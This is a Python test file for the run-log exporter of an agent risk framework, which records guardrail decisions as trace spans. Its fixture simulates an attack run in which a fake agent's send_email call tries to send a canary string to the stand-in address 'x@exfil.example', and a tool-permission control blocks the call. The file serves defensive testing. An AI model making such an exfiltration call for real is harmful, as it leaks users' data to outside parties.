from __future__ import annotations

import io
import json
from pathlib import Path

import pytest

from agent_risk_framework.runlog import (
    AttributionRecord,
    DecisionRecord,
    RunLog,
    RunRecord,
    StepRecord,
)
from agent_risk_framework.runlog.export import export, main, trace_id

CANARY = "ARF-CANARY-0123456789ABCDEF"


def a_blocked_run(log: RunLog, run_index: int = 0) -> int:
    run_id = log.record(
        RunRecord(
            experiment_id="exp-audit",
            case_id="AC01",
            case_kind="attack",
            config="single-control",
            run_index=run_index,
            seed=1337 + run_index,
            temperature=0.0,
            model="fake-tools",
            outcome="failed",
            detector_result="detected",
            guardrail_action="blocked",
            latency_ms=20.0,
            detector_latency_ms=0.5,
        )
    )
    log.record_controls(run_id, ["tool_permissions"])
    log.record_step(
        StepRecord(
            run_id=run_id,
            step_index=0,
            model_text="",
            latency_ms=10.0,
            tool_name="send_email",
            tool_args=json.dumps({"to": "x@exfil.example", "body": CANARY}),
        )
    )
    log.record_step(StepRecord(run_id=run_id, step_index=1, model_text="Done.", latency_ms=5.0))
    log.record_decision(
        DecisionRecord(
            run_id=run_id,
            seq=0,
            control="tool_permissions",
            stage="user_prompt",
            target="user_prompt",
            action="allow",
            reasons=("no rule violated",),
        )
    )
    log.record_decision(
        DecisionRecord(
            run_id=run_id,
            seq=1,
            control="tool_permissions",
            stage="tool_call",
            target="send_email",
            action="block",
            reasons=("to: 'x@exfil.example' is not on the recipient allowlist",),
            step_index=0,
            call_index=0,
            latency_ms=0.2,
        )
    )
    log.record_attribution(
        AttributionRecord(
            run_id=run_id,
            bucket="blocked_by_control",
            blocked_by=("tool_permissions",),
            basis="call_blocked",
        )
    )
    return run_id


def _records(log: RunLog, **kw: object) -> list[dict]:
    buf = io.StringIO()
    n = export(log, buf, **kw)  # type: ignore[arg-type]
    lines = buf.getvalue().splitlines()
    assert n == len(lines)
    return [json.loads(line) for line in lines]


def test_chain_is_run_step_tool_selection_policy_outcome() -> None:
    with RunLog() as log:
        a_blocked_run(log)
        recs = _records(log)
    names = [r["name"] for r in recs]
    assert names == [
        "agent.run",
        "guardrail.decision",  # run-level: the user prompt
        "agent.step",
        "agent.tool_selection",
        "guardrail.decision",  # the policy outcome for the call
        "agent.step",
    ]
    spans = {r["span_id"]: r for r in recs}
    run, prompt_check, step, call, verdict, final = recs
    assert len({r["trace_id"] for r in recs}) == 1
    assert run["parent_span_id"] is None
    assert prompt_check["parent_span_id"] == run["span_id"]
    assert step["parent_span_id"] == run["span_id"]
    assert call["parent_span_id"] == step["span_id"]
    assert verdict["parent_span_id"] == call["span_id"]
    assert final["parent_span_id"] == run["span_id"]
    assert all(r["parent_span_id"] is None or r["parent_span_id"] in spans for r in recs)

    assert run["attributes"]["run.bucket"] == "blocked_by_control"
    assert run["attributes"]["run.credited_controls"] == ["tool_permissions"]
    assert run["attributes"]["run.credit_basis"] == "call_blocked"
    assert run["attributes"]["defense.controls"] == ["tool_permissions"]
    assert call["attributes"]["gen_ai.tool.name"] == "send_email"
    assert call["attributes"]["agent.tool.executed"] is False
    assert verdict["attributes"]["security.policy.outcome"] == "block"
    assert verdict["severity_text"] == "WARN" and verdict["status"]["code"] == "ERROR"
    assert prompt_check["severity_text"] == "INFO"


def test_content_is_digested_unless_asked_for() -> None:
    with RunLog() as log:
        a_blocked_run(log)
        default = _records(log)
        full = _records(log, include_content=True)
    assert CANARY not in json.dumps(default)
    call = default[3]["attributes"]
    assert len(call["gen_ai.tool.arguments.sha256"]) == 64
    assert "gen_ai.tool.arguments" not in call
    assert CANARY in full[3]["attributes"]["gen_ai.tool.arguments"]


def test_ids_follow_run_identity_not_row_ids() -> None:
    with RunLog() as one, RunLog() as two:
        a_blocked_run(one)
        a_blocked_run(two, run_index=1)  # shift row ids in the second log
        a_blocked_run(two)
        first = _records(one)
        second = [r for r in _records(two) if r["trace_id"] == first[0]["trace_id"]]
    assert [r["span_id"] for r in first] == [r["span_id"] for r in second]
    assert len(first[0]["trace_id"]) == 32 and len(first[0]["span_id"]) == 16


def test_experiment_filter_and_trace_id_shape() -> None:
    with RunLog() as log:
        a_blocked_run(log)
        assert _records(log, experiments=["other"]) == []
        run = next(log.runs())
    assert trace_id(run) == _records_first_trace(run)


def _records_first_trace(run: RunRecord) -> str:
    with RunLog() as log:
        a_blocked_run(log, run.run_index)
        return _records(log)[0]["trace_id"]


def test_cli_writes_jsonl(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    db = tmp_path / "runs.db"
    with RunLog(db) as log:
        a_blocked_run(log)
    out = tmp_path / "audit" / "audit.jsonl"
    main(["--db", str(db), "--out", str(out)])
    lines = out.read_text(encoding="utf-8").splitlines()
    assert len(lines) == 6
    assert "6 records" in capsys.readouterr().err


def test_cli_refuses_a_missing_db(tmp_path: Path) -> None:
    with pytest.raises(SystemExit):
        main(["--db", str(tmp_path / "nope.db")])
